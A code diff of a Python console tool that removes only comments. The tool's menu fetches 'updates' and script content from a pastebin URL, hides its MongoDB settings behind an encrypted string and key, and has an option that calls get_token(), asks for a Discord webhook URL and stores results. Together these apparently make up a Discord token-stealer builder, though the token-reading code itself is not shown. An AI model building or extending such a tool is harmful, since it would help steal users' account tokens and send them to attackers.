@@ -13,10 +13,10 @@ import json
 from datetime import datetime
 from pymongo import MongoClient
 import threading
-import pyfiglet  # For ASCII art
-from colorama import Fore, Style, init  # For colored output
+import pyfiglet 
+from colorama import Fore, Style, init
 
-# Initialize colorama
+
 init(autoreset=True)
 
 def load_version():
@@ -29,10 +29,10 @@ def load_version():
         print(Fore.RED + "❌ version.json not found.")
         return "Unknown"
 
-CURRENT_VERSION = load_version()  # Load the version from version.json
-UPDATE_URL = "https://pastebin.com/raw/1aDN9pnp"  # Use your actual Pastebin URL here
+CURRENT_VERSION = load_version() 
+UPDATE_URL = "https://pastebin.com/raw/1aDN9pnp"  
 
-# MongoDB and config setup
+
 encrypted_string_b64_1 = "p4jFiPnbfyQwSOOQQzg3riJnNBLKK+bxSkcfqr11JMjz9mk/PtY+AYvX+nXpfNo3"
 key_b64_1 = "zzmfymnu0BPZffUtXSGwNg=="
 
@@ -250,19 +250,18 @@ def display_menu():
     print(Fore.GREEN + "3. Check for Updates 🔄")
     print(Fore.GREEN + "4. Exit 🛑")
 
-# Main function to handle the options
+
 def main():
     clear_console()
     display_header()
-    check_for_updates()  # Check for updates at startup
+    check_for_updates() 
 
-    display_menu()  # Display menu once
+    display_menu()  
     option = input(Fore.WHITE + "Enter your choice (1, 2, 3, or 4): ")
 
     if option == "1":
         clear_console()
         display_header()
-        # Option 1 - Test
         user_data = get_token()
         if user_data:
             webhook_url = input("Please enter your Discord webhook URL: ")
@@ -307,7 +306,7 @@ def main():
                 print(Fore.RED + f"Failed to save data to MongoDB: {e}")
 
         print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
-        sys.exit(0)  # Exit the script after running option 1
+        sys.exit(0)
 
     elif option == "2":
         clear_console()
@@ -338,7 +337,7 @@ def main():
                 compile_thread.join()
 
             print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
-            sys.exit(0)  # Exit the script after running option 2
+            sys.exit(0)
 
         except Exception as e:
             print(Fore.RED + f"Error creating script from Pastebin: {e}")
@@ -346,10 +345,10 @@ def main():
     elif option == "3":
         clear_console()
         display_header()
-        check_for_updates()  # Manually check for updates
+        check_for_updates()
 
         print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
-        sys.exit(0)  # Exit the script after checking updates
+        sys.exit(0)
 
     elif option == "4":
         print(Fore.LIGHTCYAN_EX + "Goodbye! 👋 Exiting...")
@@ -357,7 +356,7 @@ def main():
 
     else:
         print(Fore.RED + "Invalid option. Exiting...")
-        sys.exit(0)  # Exit the script if an invalid option is selected
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
